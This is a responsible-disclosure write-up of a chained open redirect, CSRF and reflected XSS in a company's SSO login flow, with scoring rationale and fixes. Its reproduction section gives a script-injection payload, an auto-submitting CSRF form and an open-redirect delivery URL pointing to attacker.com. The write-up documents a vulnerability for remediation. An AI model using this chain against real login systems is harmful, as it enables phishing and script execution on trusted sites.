# Chained Open Redirect → CSRF → Reflected XSS (3-stage chain)

**Program:** Fastweb S.p.A. — Responsible Disclosure Programme (public Hall of Fame, 2024)
**Report:** RD-0001549 (open-redirect components RD-0001548 / RD-0001550)
**Vulnerability class:** Reflected XSS via CSRF, delivered through an open redirect — A3 (Injection) · A5 (Security Misconfiguration)
**Endpoint types:** SSO logout handler · federated login page
**CVSS v3.1:** 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**Status:** Accepted — Hall of Fame recognition
**Discovery:** Q1 2024

> **Scoring note.** Originally submitted at 8.8 (High); recalibrated to 6.1 (Medium). My PoC fired `alert(document.domain)` — it demonstrated script execution in the victim's browser, but **not** data exfiltration, session theft, or any availability impact. I had scored `C:H/I:H/A:H`; the honest vector for what I proved is `C:L/I:L/A:N` with Scope:Changed. Full reasoning in the portfolio scoring note.

## TL;DR
A 3-stage chain in an Oracle Access Manager SSO stack. An unvalidated redirect on the logout endpoint became the trusted delivery vehicle for a CSRF page, which triggered a reflected XSS on the federated login endpoint — one link, starting on the company's own SSO domain. Script execution on the target origin was demonstrated; impact beyond that was not, so this is Medium.

## Root causes
- **Stage 1 — Open redirect:** the logout endpoint followed an attacker-supplied post-logout destination with no domain validation.
- **Stage 2 — Missing CSRF:** the federated login endpoint accepted cross-origin POST with no token validation.
- **Stage 3 — Reflected XSS:** the `resource_url` parameter was reflected unsanitized into the response; `"><script>alert(document.domain)</script>` executed.

## CVSS v3.1 breakdown
| Metric | Value | Rationale |
|---|---|---|
| Attack Vector | Network | Fully remote |
| Attack Complexity | Low | No special conditions |
| Privileges Required | None | No attacker account |
| User Interaction | Required | Victim clicks one link |
| Scope | Changed | Script executes under the target origin, across the boundary the redirect crossed |
| Confidentiality | Low | Script execution demonstrated; no data access shown |
| Integrity | Low | In-page manipulation; no backend integrity impact shown |
| Availability | None | No availability impact |
| **Base score** | **6.1 — Medium** | |

Recalibrated from 8.8. I had claimed `C:H/I:H/A:H` — session theft, arbitrary actions, session destruction. The PoC demonstrated none of those; it demonstrated `alert(document.domain)`. `C:L/I:L/A:N` is what I can defend.

## What makes the chain interesting
Without the open redirect, the attacker would have to convince the victim to visit `attacker.com` directly — an unrecognized domain. The open redirect on the company's **own SSO domain** turns `attacker.com/poc.html` into a link that begins with `sso.[company].com`, passing casual link inspection and many corporate link-scanning filters.

Individual components, honestly rated:
- Open redirect alone: Medium (6.1)
- CSRF on login alone: Low
- Reflected XSS reachable only as Self-XSS: usually rejected in isolation
- **Chained: Medium (6.1)** — recalibrated from an original 8.8. The value is not a larger number; it is that the chain makes an otherwise-rejected Self-XSS remotely deliverable from a trusted domain.

## Attack chain
```
[Attacker] hosts CSRF PoC (auto-POSTs XSS payload to the login endpoint)
      │
      ▼
[Delivery URL built on the open redirect]
   https://[SSO-DOMAIN]/logout?destination=https://attacker.com/poc.html
      │
      ▼
[Victim clicks — link starts on the company SSO domain]
      │  logout fires → redirect to attacker.com/poc.html
      ▼
[CSRF page auto-POSTs to the login endpoint with the payload in resource_url]
      │
      ▼
[Login server reflects payload unsanitized → script executes on target origin]
```

## Reproduction (redacted)
`[SSO-DOMAIN]` and `[LOGIN-DOMAIN]` are redacted company subdomains.

**Step 1 — Confirm the open redirect.** `https://[SSO-DOMAIN]/logout?destination=https://example.com` redirects to `example.com` after logout.

**Step 2 — Confirm the reflection.** POST to `[LOGIN-DOMAIN]` with `resource_url="><script>alert(document.domain)</script>` and verify the tag appears unencoded and executes.

**Step 3 — CSRF PoC.**
```html
<!DOCTYPE html>
<html><body>
  <form action="https://[LOGIN-DOMAIN]/" method="POST" id="f">
    <input type="hidden" name="resource_url"
           value='"><script>alert(document.domain)</script>'>
    <!-- additional hidden fields matching the original request -->
  </form>
  <script>document.getElementById('f').submit();</script>
</body></html>
```

**Step 4 — Build the delivery URL** using the open redirect and send it to the victim. One click runs logout → redirect → CSRF POST → XSS.

## Fix recommendations
- **Open redirect:** validate `destination` against a strict server-side allowlist; prefer opaque redirect tokens; reject external domains.
- **CSRF:** per-session tokens validated on every non-idempotent request; `SameSite=Strict` on session cookies.
- **Reflected XSS:** HTML-encode all reflected values; add a CSP as defense-in-depth.

Fixing any one of the three breaks the chain; fixing all three is required to be secure against each issue individually.
